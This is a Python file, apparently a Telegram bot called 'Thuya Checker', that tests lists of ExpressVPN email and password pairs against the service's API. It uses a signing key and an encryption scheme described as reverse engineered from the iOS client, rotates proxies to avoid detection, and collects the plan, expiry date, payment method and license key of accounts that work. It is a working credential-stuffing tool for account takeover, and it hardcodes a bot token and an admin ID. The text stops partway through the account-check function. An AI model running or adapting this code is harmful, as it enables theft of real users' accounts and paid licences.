# -*- coding: utf-8 -*-
"""
❤️ Thuya Checker V12
⚡️ Thu Ya 𝗘𝘅𝗽𝗿𝗲𝘀𝘀𝗩𝗣𝗡 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝘃𝟭𝟬

Full API flow:
  1) POST /apis/v2/credentials  -> access_token
  2) POST /apis/v2/batch        -> subscription (plan, expire, payment, auto-renew)
  3) GET  /api/v2/subscriptions -> license key

Hit / Free Account dual mode • Compact Duolingo-style UI
Reverse engineered from ExpressVPN iOS client v21.21.0 (UI 11.5.2)
"""

import os
import re
import gzip
import hmac
import json
import base64
import hashlib
import secrets
import threading
import traceback
import random
import itertools
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import requests
import telebot
from telebot import types

# ---------- CRYPTO (CMS envelope encryption + AES-128-CBC) ----------
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.x509 import load_der_x509_certificate
from cryptography.hazmat.backends import default_backend


# ============================================================
# CONFIG  — အရင်ဆုံး ဒီ ၂ ခုကို ပြင်ပါ
# ============================================================
BOT_TOKEN  = os.getenv("BOT_TOKEN",  "8515206726:AAF1Gw5RXaYxE7QgjgHrmIxPwrB2EN6oeU0")
ADMIN_IDS  = [int(x) for x in os.getenv("ADMIN_IDS", "8085966245").split(",") if x.strip()]
HIT_CHAT   = int(os.getenv("HIT_CHAT", str(ADMIN_IDS[0])))   # Hit ပို့မယ့်နေရာ
MAX_THREADS = int(os.getenv("THREADS", "10"))

# ============================================================
# PROXY STORE
# ============================================================
PROXY_FILE = os.getenv("PROXY_FILE", "proxies.json")
# Each proxy: {"type": "http"|"https"|"socks4"|"socks5", "host": str, "port": int,
#              "user": str|None, "pass": str|None}
PROXIES: list = []
_proxy_lock = threading.Lock()
_proxy_cycle = None
# uid -> {"step": "type"|"creds", "type": str, "host": str, "port": int}
PROXY_PENDING: dict = {}
# Thread-local: tracks last proxy used by current worker thread
_proxy_local = threading.local()


def _proxy_to_url(p: dict) -> str:
    auth = ""
    if p.get("user"):
        u = p["user"]
        pw = p.get("pass") or ""
        auth = f"{u}:{pw}@" if pw else f"{u}@"
    return f"{p['type']}://{auth}{p['host']}:{p['port']}"


def _proxy_label(p: dict) -> str:
    auth = " 🔒" if p.get("user") else ""
    return f"{p['type'].upper()}  {p['host']}:{p['port']}{auth}"


def load_proxies():
    global PROXIES, _proxy_cycle
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                PROXIES = [p for p in data if isinstance(p, dict) and p.get("host") and p.get("port")]
    except Exception as e:
        print(f"[PROXY] load error: {e}")
        PROXIES = []
    _proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None


def save_proxies():
    try:
        with open(PROXY_FILE, "w", encoding="utf-8") as f:
            json.dump(PROXIES, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[PROXY] save error: {e}")


def add_proxy(p: dict):
    global _proxy_cycle
    with _proxy_lock:
        PROXIES.append(p)
        _proxy_cycle = itertools.cycle(PROXIES)
        save_proxies()


def remove_proxy(idx: int) -> bool:
    global _proxy_cycle
    with _proxy_lock:
        if 0 <= idx < len(PROXIES):
            PROXIES.pop(idx)
            _proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None
            save_proxies()
            return True
        return False


def clear_proxies():
    global _proxy_cycle
    with _proxy_lock:
        PROXIES.clear()
        _proxy_cycle = None
        save_proxies()


def _pick_proxy():
    """Return a single proxy dict, or None."""
    with _proxy_lock:
        if not PROXIES:
            return None
        return random.choice(PROXIES)


def next_proxy_dict():
    """Return a requests-compatible proxies dict, or None if no proxies set."""
    p = _pick_proxy()
    if not p:
        return None
    url = _proxy_to_url(p)
    return {"http": url, "https": url}


def reset_thread_proxy():
    """Clear last-used proxy for current thread (call at start of each account check)."""
    _proxy_local.last = None


def get_thread_proxy() -> dict | None:
    """Return the proxy dict last successfully used in this thread."""
    return getattr(_proxy_local, "last", None)


def parse_proxy_string(text: str, ptype: str) -> dict | None:
    """
    Accepts:
      host:port
      host:port:user:pass
      user:pass@host:port
      http://host:port  (scheme is overridden by ptype)
    """
    text = text.strip()
    if not text:
        return None
    # Strip scheme if present
    text = re.sub(r"^[a-zA-Z0-9]+://", "", text)
    user = pwd = None
    if "@" in text:
        cred, hp = text.rsplit("@", 1)
        if ":" in cred:
            user, pwd = cred.split(":", 1)
        else:
            user = cred
        text = hp
    parts = text.split(":")
    try:
        if len(parts) == 2:
            host, port = parts[0], int(parts[1])
        elif len(parts) == 4:
            host, port = parts[0], int(parts[1])
            user, pwd = parts[2], parts[3]
        else:
            return None
    except ValueError:
        return None
    if not host or port <= 0 or port > 65535:
        return None
    return {"type": ptype.lower(), "host": host, "port": port, "user": user, "pass": pwd}


# ---------- Proxy-aware HTTP wrappers ----------
def _request(method: str, url: str, **kwargs):
    """requests wrapper with proxy rotation + auto-retry on a different proxy.

    Records the actually-used proxy on thread-local for later reporting.
    """
    last_exc = None
    tries = 3 if PROXIES else 1
    for _ in range(tries):
        p = _pick_proxy()
        proxies = None
        if p:
            purl = _proxy_to_url(p)
            proxies = {"http": purl, "https": purl}
        try:
            resp = requests.request(method, url, proxies=proxies, **kwargs)
            # Track only on success
            _proxy_local.last = p
            return resp
        except Exception as e:
            last_exc = e
            continue
    if last_exc:
        raise last_exc
    return requests.request(method, url, **kwargs)


def http_get(url, **kw):
    return _request("GET", url, **kw)


def http_post(url, **kw):
    return _request("POST", url, **kw)


# Load saved proxies at startup
load_proxies()

# ---------- Ensure PySocks available for SOCKS proxies ----------
_SOCKS_AVAILABLE = False
try:
    import socks  # noqa: F401  (PySocks)
    _SOCKS_AVAILABLE = True
except ImportError:
    try:
        import subprocess as _sp
        import sys as _sys
        print("[PROXY] Installing PySocks for SOCKS proxy support…")
        _sp.check_call([_sys.executable, "-m", "pip", "install", "--quiet", "PySocks"])
        import socks  # noqa: F401
        _SOCKS_AVAILABLE = True
        print("[PROXY] ✅ PySocks installed.")
    except Exception as _e:
        print(f"[PROXY] ⚠️ PySocks not available: {_e}")
        print("[PROXY]    Run: pip install PySocks  (or: pip install requests[socks])")


# ---------- Proxy live tester ----------
PROXY_TEST_URL = "https://api.ipify.org?format=json"

def test_one_proxy(p: dict, timeout: int = 12) -> dict:
    """Test a single proxy. Returns {ok, ip, latency_ms, error}."""
    import time as _t
    url_p = _proxy_to_url(p)
    proxies = {"http": url_p, "https": url_p}
    t0 = _t.time()
    try:
        r = requests.get(PROXY_TEST_URL, proxies=proxies, timeout=timeout)
        latency = int((_t.time() - t0) * 1000)
        if r.status_code == 200:
            try:
                ip = r.json().get("ip", "?")
            except Exception:
                ip = r.text.strip()[:40]
            return {"ok": True, "ip": ip, "latency": latency, "error": ""}
        return {"ok": False, "ip": "", "latency": latency, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        latency = int((_t.time() - t0) * 1000)
        msg = str(e)
        # Detect missing PySocks
        if "SOCKSHandler" in msg or "Missing dependencies for SOCKS" in msg:
            msg = "PySocks missing → run: pip install PySocks"
        elif len(msg) > 80:
            msg = msg[:77] + "…"
        return {"ok": False, "ip": "", "latency": latency, "error": msg}

# ============================================================
# EXPRESSVPN CONSTANTS  (from .opk reverse)
# ============================================================
HMAC_KEY = b"@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
SIG_PREFIX = "2 "
SIG_SUFFIX = " 91c776e"
USER_AGENT = "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2"
API_HOST   = "https://www.expressapisv2.net"
PORTAL_API = "https://www.expressvpn.com/api/v2/subscriptions"

CERT_B64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV"
    "BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX"
    "aWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBF"
    "MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50"
    "ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB"
    "CgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hH"
    "Ans8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8e"
    "BgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgY"
    "ELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFo"
    "OmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsv"
    "q/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0"
    "CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0w"
    "DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpC"
    "iqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp"
    "/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZCl"
    "V6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmP"
    "q4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/"
    "t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
)
CERT_DER = base64.b64decode(CERT_B64)
CERT_OBJ = load_der_x509_certificate(CERT_DER, default_backend())
CERT_PUBKEY = CERT_OBJ.public_key()


# ============================================================
# CRYPTO HELPERS
# ============================================================

def random_install_id() -> str:
    """64-char hex string (matches LoliScript ?h?h... x64)."""
    return secrets.token_hex(32)


def hmac_sha1_b64(data: bytes, key: bytes = HMAC_KEY) -> str:
    return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode()


def make_xsig(raw: str) -> str:
    return f"{SIG_PREFIX}{hmac_sha1_b64(raw.encode())}{SIG_SUFFIX}"


def make_xsig_bytes(raw: bytes) -> str:
    return f"{SIG_PREFIX}{hmac_sha1_b64(raw)}{SIG_SUFFIX}"


def gzip_bytes(s: str) -> bytes:
    """GZip with default compression, ASCII bytes (matches .NET GZipStream)."""
    buf = BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
        gz.write(s.encode("ascii"))
    return buf.getvalue()


def cms_envelope_encrypt(plaintext: bytes) -> bytes:
    """
    Reproduce .NET EnvelopedCms with content-encryption OID 1.3.14.3.2.7
    (DES-CBC).  The recipient cert is RSA, so the CEK is wrapped with
    RSAES-PKCS1-v1_5.

    Output is a CMS ContentInfo (DER) — same format .NET produces.
    """
    # Build CMS manually via asn1crypto for fidelity.
    from asn1crypto import cms, algos, x509, core

    # ---- Compatibility shim (V11.1) ----
    # cms.KeyEncryptionAlgorithm accepts string aliases like 'rsa'.
    # algos.EncryptionAlgorithm does NOT — it tries to parse 'rsa' as an int OID
    # and raises: "invalid literal for int() with base 10: 'rsa'".
    # Always prefer cms.* classes; fall back to algos.* only if missing.
    _KeyEncAlgo = (
        getattr(cms, "KeyEncryptionAlgorithm", None)
        or getattr(algos, "KeyEncryptionAlgorithm", None)
        or getattr(algos, "KeyEncryptionAlgorithmId", None)
    )
    _ContentEncAlgo = (
        getattr(cms, "EncryptionAlgorithm", None)
        or getattr(algos, "EncryptionAlgorithm", None)
    )
    if _KeyEncAlgo is None or _ContentEncAlgo is None:
        raise RuntimeError(
            "asn1crypto missing required CMS algorithm classes — "
            "pin asn1crypto==1.5.1 in requirements.txt"
        )

    # 1) Generate 8-byte DES key + 8-byte IV (DES-CBC = 64-bit block)
    cek = secrets.token_bytes(8)
    iv  = secrets.token_bytes(8)

    # 2) DES-CBC encrypt with PKCS7 padding
    from cryptography.hazmat.primitives.ciphers import algorithms as _algs
    # `cryptography` deprecates DES but still supports via TripleDES?  Use raw
    # via PyCryptodome fallback to keep things simple.
    try:
        from Crypto.Cipher import DES
        from Crypto.Util.Padding import pad
        cipher = DES.new(cek, DES.MODE_CBC, iv)
        encrypted_content = cipher.encrypt(pad(plaintext, 8))
    except ImportError:
        raise RuntimeError("pycryptodome required: pip install pycryptodome")

    # 3) Wrap CEK with recipient RSA pubkey (PKCS1 v1.5)
    cert_asn1 = x509.Certificate.load(CERT_DER)
    wrapped_key = CERT_PUBKEY.encrypt(cek, asym_padding.PKCS1v15())

    # 4) Build RecipientInfo (issuer + serial)
    rid = cms.RecipientIdentifier({
        "issuer_and_serial_number": cms.IssuerAndSerialNumber({
            "issuer": cert_asn1.issuer,
            "serial_number": cert_asn1.serial_number,
        })
    })
    recipient_info = cms.RecipientInfo("ktri", cms.KeyTransRecipientInfo({
        "version": "v0",
        "rid": rid,
        "key_encryption_algorithm": _KeyEncAlgo({
            "algorithm": "rsa",  # PKCS1 v1.5
        }),
        "encrypted_key": wrapped_key,
    }))

    # 5) EncryptedContentInfo (DES-CBC OID 1.3.14.3.2.7)
    enc_content_info = cms.EncryptedContentInfo({
        "content_type": "data",
        "content_encryption_algorithm": _ContentEncAlgo({
            "algorithm": "des",
            "parameters": core.OctetString(iv),
        }),
        "encrypted_content": encrypted_content,
    })

    enveloped = cms.EnvelopedData({
        "version": "v0",
        "recipient_infos": cms.RecipientInfos([recipient_info]),
        "encrypted_content_info": enc_content_info,
    })

    content_info = cms.ContentInfo({
        "content_type": "enveloped_data",
        "content": enveloped,
    })
    return content_info.dump()


def aes_cbc_decrypt(ciphertext: bytes, key_b64: str, iv_b64: str) -> bytes:
    key = base64.b64decode(key_b64)
    iv  = base64.b64decode(iv_b64)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


# ============================================================
# CHECK FLOW (3 steps)
# ============================================================

def parse_lr(text: str, left: str, right: str) -> str:
    i = text.find(left)
    if i < 0:
        return ""
    j = text.find(right, i + len(left))
    if j < 0:
        return ""
    return text[i + len(left):j]


def parse_field(text: str, key: str) -> str:
    """Read a JSON-ish field even when the API returns escaped JSON-in-JSON."""
    if not text:
        return ""
    texts = [text]
    try:
        texts.append(text.encode("utf-8", "ignore").decode("unicode_escape"))
    except Exception:
        pass
    patterns = [
        rf'"{re.escape(key)}"\s*:\s*"([^"\\]*(?:\\.[^"\\]*)*)"',
        rf'"{re.escape(key)}"\s*:\s*([^,\}}\]\s]+)',
    ]
    for src in texts:
        for pat in patterns:
            m = re.search(pat, src)
            if m:
                return m.group(1).strip().strip('"')
    return ""


def _key_norm(value) -> str:
    return re.sub(r"[^a-z0-9]", "", str(value).lower())


def _has_value(value) -> bool:
    if value is None:
        return False
    if value is False or value == 0:
        return True
    if isinstance(value, (list, dict)) and not value:
        return False
    if isinstance(value, str) and value.strip().lower() in ("", "?", "null", "none", "unknown", "n/a"):
        return False
    return True


def parse_possible_json(value, depth: int = 0):
    """Parse normal JSON plus double-escaped JSON strings returned inside batch bodies."""
    if depth > 5:
        return value
    if isinstance(value, dict):
        return {k: parse_possible_json(v, depth + 1) for k, v in value.items()}
    if isinstance(value, list):
        return [parse_possible_json(v, depth + 1) for v in value]
    if not isinstance(value, str):
        return value

    raw = value.strip()
    candidates = [raw]
    try:
        candidates.append(raw.encode("utf-8", "ignore").decode("unicode_escape"))
    except Exception:
        pass
    for candidate in candidates:
        candidate = candidate.strip()
        if not candidate or candidate[0] not in "[{":
            continue
        try:
            return parse_possible_json(json.loads(candidate), depth + 1)
        except Exception:
            continue
    return value


def deep_get_any(obj, keys):
    targets = {_key_norm(k) for k in keys}
    obj = parse_possible_json(obj)
    if isinstance(obj, dict):
        for k, v in obj.items():
            if _key_norm(k) in targets and _has_value(v):
                return v
        for v in obj.values():
            found = deep_get_any(v, keys)
            if _has_value(found):
                return found
    elif isinstance(obj, list):
        for item in obj:
            found = deep_get_any(item, keys)
            if _has_value(found):
                return found
    return None


def deep_has_key(obj, keys) -> bool:
    targets = {_key_norm(k) for k in keys}
    obj = parse_possible_json(obj)
    if isinstance(obj, dict):
        for k, v in obj.items():
            if _key_norm(k) in targets:
                return True
            if deep_has_key(v, keys):
                return True
    elif isinstance(obj, list):
        return any(deep_has_key(item, keys) for item in obj)
    return False


def text_field_any(text: str, keys) -> str:
    for key in keys:
        val = parse_field(text, key)
        if _has_value(val):
            return val
    return ""


def value_to_text(value) -> str:
    value = parse_possible_json(value)
    if not _has_value(value):
        return ""
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (int, float)):
        return str(value)
    if isinstance(value, dict):
        useful = []
        for key in ("brand", "type", "name", "method", "provider", "payment_method", "last4", "last_4"):
            val = deep_get_any(value, [key])
            if _has_value(val):
                useful.append(str(val))
        return " ".join(dict.fromkeys(useful)).strip()
    if isinstance(value, list):
        for item in value:
            txt = value_to_text(item)
            if txt:
                return txt
        return ""
    return str(value).strip().strip('"')


def normalize_plan(value) -> str:
    text = value_to_text(value)
    if not text:
        return "?"
    low = text.lower().strip()
    # Generic / unknown words -> let duration inference take over later
    if low in ("full", "complete", "active", "paid", "premium", "standard", "subscription", "sub"):
        return "?"
    month_words = {"monthly": "1 Months", "month": "1 Months", "1-month": "1 Months"}
    year_words = {"yearly": "12 Months", "annual": "12 Months", "annually": "12 Months", "year": "12 Months", "1-year": "12 Months"}
    if low in month_words:
        return month_words[low]
    if low in year_words:
        return year_words[low]
    # Pure numbers usually mean months
    if re.fullmatch(r"\d+", text):
        n = int(text)
        return f"{n} Months"
    m = re.search(r"p?(\d+)\s*m\b", low)  # "P1M", "1m"
    if m:
        return f"{int(m.group(1))} Months"
    m = re.search(r"(\d+)\s*(?:month|months|mo)\b", low)
    if m:
        return f"{int(m.group(1))} Months"
    m = re.search(r"p?(\d+)\s*y\b", low)  # "P1Y", "1y"
    if m:
        return f"{int(m.group(1)) * 12} Months"
    m = re.search(r"(\d+)\s*(?:year|years|yr)\b", low)
    if m:
        return f"{int(m.group(1)) * 12} Months"
    if "lifetime" in low or "lifelong" in low:
        return "Lifetime"
    if "trial" in low:
        return "Trial"
    return text.replace("_", " ").replace("-", " ").title()


def _to_timestamp(value):
    text = value_to_text(value)
    if not text:
        return None
    try:
        ts = float(text)
        if ts > 10_000_000_000:
            ts = ts / 1000
        return ts
    except Exception:
        pass
    try:
        iso = text.replace("Z", "+00:00")
        dt = datetime.fromisoformat(iso)
        return dt.timestamp()
    except Exception:
        return None


def infer_plan_from_duration(start_val, end_val) -> str:
    s = _to_timestamp(start_val)
    e = _to_timestamp(end_val)
    if s is None or e is None or e <= s:
        return "?"
    days = (e - s) / 86400.0
    # Snap to common plan durations
    candidates = [
        (30, "1 Months"),
        (90, "3 Months"),
        (180, "6 Months"),
        (365, "12 Months"),
        (730, "24 Months"),
        (1095, "36 Months"),
    ]
    best_label = "?"
    best_diff = 9999
    for target_days, label in candidates:
        diff = abs(days - target_days)
        # Allow generous tolerance (~20 days) for prorated/partial cycles
        if diff < best_diff and diff <= max(25, target_days * 0.12):
            best_diff = diff
            best_label = label
    if best_label != "?":
        return best_label
    # Fallback: round to nearest month
    months = max(1, int(round(days / 30)))
    return f"{months} Months"


def parse_expiry(value):
    text = value_to_text(value)
    if not text:
        return "?", 0
    try:
        ts = float(text)
        if ts > 10_000_000_000:  # milliseconds
            ts = ts / 1000
        dt = datetime.utcfromtimestamp(ts)
        return dt.strftime("%Y-%m-%d"), (dt - datetime.utcnow()).days
    except Exception:
        pass
    try:
        iso = text.replace("Z", "+00:00")
        dt = datetime.fromisoformat(iso)
        if dt.tzinfo is not None:
            dt = datetime.utcfromtimestamp(dt.timestamp())
        return dt.strftime("%Y-%m-%d"), (dt - datetime.utcnow()).days
    except Exception:
        if len(text) >= 10:
            return text[:10], 0
    return "?", 0


def normalize_auto_renew(value) -> str:
    if not _has_value(value):
        return "?"
    text = value_to_text(value).strip().lower()
    if text in ("true", "1", "yes", "y", "enabled", "active", "on", "auto", "renewing"):
        return "✅"
    if text in ("false", "0", "no", "n", "disabled", "inactive", "off", "manual", "cancelled", "canceled"):
        return "❌"
    return value_to_text(value) or "?"


def normalize_payment(value) -> str:
    text = value_to_text(value)
    if not text:
        return "?"
    cleaned = text.replace("_", " ").replace("-", " ").strip()
    aliases = {
        "paypal": "PayPal",
        "apple pay": "Apple Pay",
        "google pay": "Google Pay",
        "credit card": "Credit Card",
        "card": "Card",
    }
    return aliases.get(cleaned.lower(), cleaned.title())


def extract_subscription_details(data, raw_text: str = "") -> dict:
    data = parse_possible_json(data)
    if not raw_text:
        try:
            raw_text = json.dumps(data, ensure_ascii=False)
        except Exception:
            raw_text = ""

    plan_keys = ["billing_cycle", "billing_period", "plan_type", "plan", "plan_name", "subscription_plan", "product_name", "duration", "term", "period"]
    expire_keys = ["expiration_time", "expiration_date", "expires_at", "expires_on", "expire_at", "end_date", "renewal_date", "next_billing_date", "next_billing_at", "current_period_end", "valid_until"]
    renew_keys = ["auto_bill", "auto_renew", "autoRenew", "auto_renewal", "renewal_enabled", "is_auto_renew", "will_renew", "recurring"]
    payment_keys = ["payment_method", "payment_type", "payment_provider", "paymentMethod", "provider", "gateway", "method", "card_brand", "brand"]
    start_keys = ["start_date", "started_at", "start_time", "current_period_start", "subscription_start", "created_at", "purchase_date", "begin_date"]

    plan_val = deep_get_any(data, plan_keys) or text_field_any(raw_text, plan_keys)
    expire_val = deep_get_any(data, expire_keys) or text_field_any(raw_text, expire_keys)
    renew_val = deep_get_any(data, renew_keys) or text_field_any(raw_text, renew_keys)
    payment_val = deep_get_any(data, payment_keys) or text_field_any(raw_text, payment_keys)
    start_val = deep_get_any(data, start_keys) or text_field_any(raw_text, start_keys)

    expire, days_left = parse_expiry(expire_val)
    plan_label = normalize_plan(plan_val)
    # If the API returned a generic word like "full" (-> "?"), infer plan from start/end dates
    if plan_label == "?":
        inferred = infer_plan_from_duration(start_val, expire_val)
        if inferred != "?":
            plan_label = inferred
    details = {
        "plan": plan_label,
        "expire": expire,
        "days_left": days_left,
        "auto_renew": normalize_auto_renew(renew_val),
        "payment": normalize_payment(payment_val),
    }
    details["has_sub_data"] = any(details[k] != "?" for k in ("plan", "expire", "auto_renew", "payment"))

    status_val = value_to_text(deep_get_any(data, ["subscription_status", "account_status", "status"]) or text_field_any(raw_text, ["subscription_status", "account_status", "status"])).lower()
    explicit_free_text = any(x in raw_text.lower() for x in ("no_active_sub", "no active subscription", '"subscription":null', "revoked", "cancelled", "canceled", "expired"))
    details["explicit_free"] = status_val in ("revoked", "expired", "cancelled", "canceled", "inactive") or explicit_free_text
    if not details["explicit_free"] and deep_has_key(data, ["subscription"]) and not _has_value(deep_get_any(data, ["subscription"])):
        details["explicit_free"] = True
    return details


def merge_details(primary: dict, fallback: dict) -> dict:
    merged = dict(primary or {})
    for key in ("plan", "expire", "auto_renew", "payment"):
        if not _has_value(merged.get(key)) or merged.get(key) == "?":
            val = (fallback or {}).get(key)
            if _has_value(val):
                merged[key] = val
    if not _has_value(merged.get("days_left")) or merged.get("expire") == "?":
        merged["days_left"] = (fallback or {}).get("days_left", merged.get("days_left", 0))
    return merged


def extract_portal_details(access_token: str) -> dict:
    details = {"license": "", "plan": "?", "expire": "?", "days_left": 0, "auto_renew": "?", "payment": "?"}
    try:
        portal_headers = {
            "Host": "www.expressvpn.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://portal.expressvpn.com/my-subscriptions",
            "authorization": f"Bearer {access_token}",
            "content-type": "application/json",
            "x-tenant": "xvpn",
            "Origin": "https://portal.expressvpn.com",
        }
        rl = http_get(PORTAL_API, headers=portal_headers, timeout=30)
        raw = rl.text or ""
        data = parse_possible_json(raw)

        license_key = deep_get_any(data, ["longCode", "long_code", "license", "license_key", "activation_code", "activationCode", "code"])
        if not license_key:
            codes = re.findall(r'longCode"\s*:\s*"([^"]+)"', raw)
            if not codes:
                codes = re.findall(r'(?:license|activation[_-]?code|code)"\s*:\s*"([A-Z0-9]{10,})"', raw, flags=re.I)
            if codes:
                license_key = codes[-1]
        if license_key:
            details["license"] = str(license_key).strip()

        sub_details = extract_subscription_details(data, raw)
        details = merge_details(details, sub_details)
    except Exception:
        pass
    return details


def extract_license(access_token: str) -> str:
    return extract_portal_details(access_token).get("license", "")


def days_emoji(days: int) -> str:
    if days >= 180: return "🟢"
    if days >= 30:  return "🟡"
    return "🔴"


def normalize_days_left(details: dict) -> int:
    """Always recalculate days_left from expire date so old accounts never become hits."""
    days_left = details.get("days_left", 0)
    expire_val = details.get("expire", "?")
    if expire_val != "?" and len(str(expire_val)) >= 10:
        try:
            exp_dt = datetime.strptime(str(expire_val)[:10], "%Y-%m-%d")
            days_left = (exp_dt - datetime.utcnow()).days
            details["days_left"] = days_left
        except Exception:
            pass
    try:
        return int(days_left)
    except Exception:
        return 0


def account_status_from_details(details: dict) -> str:
    """Premium hit ONLY when expire date is known AND today/future.
    Unknown expire ('?') or past dates -> expired/free (no message will be sent)."""
    expire_val = details.get("expire", "?")
    days_left = normalize_days_left(details)
    # No expire date at all => not a real premium hit
    if expire_val == "?" or not expire_val:
        return "expired"
    # Past date => expired
    if days_left < 0:
        return "expired"
    # Must have at least one real subscription field (plan/payment/renew)
    plan_val = str(details.get("plan", "?")).strip()
    pay_val = str(details.get("payment", "?")).strip()
    renew_val = str(details.get("auto_renew", "?")).strip()
    if plan_val in ("", "?") and pay_val in ("", "?") and renew_val in ("", "?"):
        return "expired"
    return "hit"


def check_account(email: str, password: str) -> dict:
    """Returns dict with status='hit'|'free'|'fail' and details."""
    install_id = random_install_id()
    iv_b64  = base64.b64encode(secrets.token_bytes(16)).decode()
    key_b64 = base64.b64encode(secrets.token_bytes(16)).decode()

    # ---------- STEP 1: LOGIN ----------
    body_json = json.dumps(
        {"email": email, "iv": iv_b64, "key": key_b64, "password": password},
        separators=(",", ":"),
    )
    gzipped   = gzip_bytes(body_json)
    encrypted = cms_envelope_encrypt(gzipped)

    header_raw = (
        f"POST /apis/v2/credentials?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    headers = {
        "User-Agent": USER_AGENT,
        "Expect": "",
        "Content-Type": "application/octet-stream",
        "X-Body-Compression": "gzip",
        "X-Signature": make_xsig(header_raw),
        "X-Body-Signature": make_xsig_bytes(encrypted),
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
    }
    url = (
        f"{API_HOST}/apis/v2/credentials?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    try:
        r = http_post(url, headers=headers, data=encrypted, timeout=30)
    except Exception as e:
        return {"status": "fail", "error": f"Network: {e}"}

    if r.status_code in (400, 401):
        return {"status": "fail", "error": f"Invalid creds ({r.status_code})"}
    if r.status_code != 200:
        return {"status": "fail", "error": f"HTTP {r.status_code}"}

    # Decrypt response
    try:
        resp_text = aes_cbc_decrypt(r.content, key_b64, iv_b64).decode("utf-8", "replace")
    except Exception as e:
        return {"status": "fail", "error": f"Decrypt: {e}"}

    access_token = parse_lr(resp_text, 'access_token":"', '"')
    if not access_token:
        return {"status": "fail", "error": "No access_token"}

    # ---------- STEP 2: SUBSCRIPTION (batch) ----------
    sub_raw = (
        f"GET /apis/v2/subscription?access_token={access_token}"
        f"&client_version=11.5.2&installation_id={install_id}"
        f"&os_name=ios&os_version=14.4&reason=activation_with_email"
    )
    sub_sig = make_xsig(sub_raw)

    batch_raw = (
        f"POST /apis/v2/batch?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    batch_sig = make_xsig(batch_raw)

    capture_body = json.dumps([{
        "headers": {"Accept-Language": "en", "X-Signature": sub_sig},
        "method": "GET",
        "url": (
            f"/apis/v2/subscription?access_token={access_token}"
            f"&client_version=11.5.2&installation_id={install_id}"
            f"&os_name=ios&os_version=14.4&reason=activation_with_email"
        ),
    }], separators=(",", ":"))

    cap_sig = make_xsig(capture_body)

    batch_url = (
        f"{API_HOST}/apis/v2/batch?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    # Body must actually be gzipped, and X-Body-Signature must sign the gzipped bytes.
    capture_body_gz = gzip_bytes(capture_body)
    batch_headers = {
        "User-Agent": USER_AGENT,
        "Expect": "",
        "X-Body-Compression": "gzip",
        "X-Signature": batch_sig,
        "X-Body-Signature": make_xsig_bytes(capture_body_gz),
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json",
    }
    try:
        rb = http_post(batch_url, headers=batch_headers, data=capture_body_gz, timeout=30)
        sub_body = rb.text
        sub_status = rb.status_code
    except Exception as e:
        sub_body = ""
        sub_status = 0

    # DEBUG: log raw sub_body for analysis
